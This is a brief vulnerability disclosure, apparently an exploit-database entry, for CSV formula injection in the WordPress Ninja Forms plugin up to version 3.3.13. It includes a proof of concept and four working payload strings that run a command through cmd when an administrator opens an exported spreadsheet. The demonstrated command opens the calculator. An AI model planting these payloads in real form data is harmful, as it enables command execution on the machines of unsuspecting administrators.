# 1. Technical Description:
# WordPress Ninja Forms plugin version 3.3.13 and before are affected by Remote Code Execution
# through the CSV injection vulnerability. This allows an application user
# to inject commands as part of the fields of forms and these commands are executed when a user with
# greater privilege exports the data in CSV and opens that file on his machine.

# 2. Proof Of Concept (PoC):
# Enter the payload =SUM(1+1)*cmd|' /C calc'!A0 in any field of the form,
# for example, in name field.
# When the user with high privileges logs in to the application, export
# data in CSV and opens the
# generated file, the command is executed and the calculator will run open
# on the machine.

# 3. Payloads:
=SUM(1+1)*cmd|' /C calc'!A0
+SUM(1+1)*cmd|' /C calc'!A0
-SUM(1+1)*cmd|' /C calc'!A0
@SUM(1+1)*cmd|' /C calc'!A0
